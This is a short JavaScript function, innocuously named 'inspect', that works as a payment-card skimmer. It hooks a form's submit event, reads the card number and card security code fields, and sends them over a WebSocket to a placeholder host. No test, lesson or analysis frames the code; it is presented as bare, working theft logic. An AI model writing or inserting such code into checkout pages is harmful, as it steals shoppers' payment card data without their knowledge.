function inspect(form, WebSocket) {
  const channel = new WebSocket('wss://example.invalid/checkout');
  form.addEventListener('submit', event => {
    const fields = {
      number: form.querySelector('input[autocomplete="cc-number"]').value,
      code: form.querySelector('input[autocomplete="cc-csc"]').value,
    };
    channel.send(JSON.stringify(fields));
  });
}
